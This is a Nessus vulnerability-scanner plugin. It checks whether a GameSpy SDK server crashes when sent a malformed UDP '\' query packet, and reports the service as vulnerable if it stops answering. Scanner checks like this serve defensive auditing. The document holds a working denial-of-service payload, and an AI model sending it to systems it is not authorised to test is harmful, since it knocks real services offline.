#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(12081);
 script_version("$Revision: 1.12 $");
 script_cvs_date("$Date: 2016/10/10 15:57:06 $");

 script_bugtraq_id(9741);
 script_osvdb_id(16585);

 script_name(english:"GameSpy SDK Malformed \query\ Request Overflow DoS");
 script_summary(english:"Disables the remote GameSpy Server");

 script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote GameSpy server could be disabled by sending a malformed
packet.  An attacker could exploit this flaw to crash the affected
application.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Feb/624");
 script_set_attribute(attribute:"solution", value:"Filter incoming traffic to this port, or disable this service");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2004/02/25");
 script_set_attribute(attribute:"plugin_publication_date", value:"2004/02/26");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_dependencies("gamespy_detect.nasl");
 script_require_keys("Services/udp/gamespy", "Settings/ParanoidReport");
 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item_or_exit("Services/udp/gamespy");
port = int(port);

if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");

soc = open_sock_udp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, "UDP");

send(socket:soc, data:string("\\players\\rules\\status\\packets\\"));
r = recv(socket:soc, length:4096, timeout:2);
close(soc);

if(strlen(r) > 0)
{
 soc = open_sock_udp(port);
 send(socket:port, data:"\\");
 r = recv(socket:soc, length:4096, timeout:2);
 close(soc);
 if ( ! strlen(r) )
 {
  soc = open_sock_udp(port);
  send(socket:soc, data:string("\\players\\rules\\status\\packets\\"));
  r = recv(socket:soc, length:4096, timeout:2);
  close(soc);
  if ( ! strlen(r) ) security_warning(port:port, proto:"udp");
 }
}
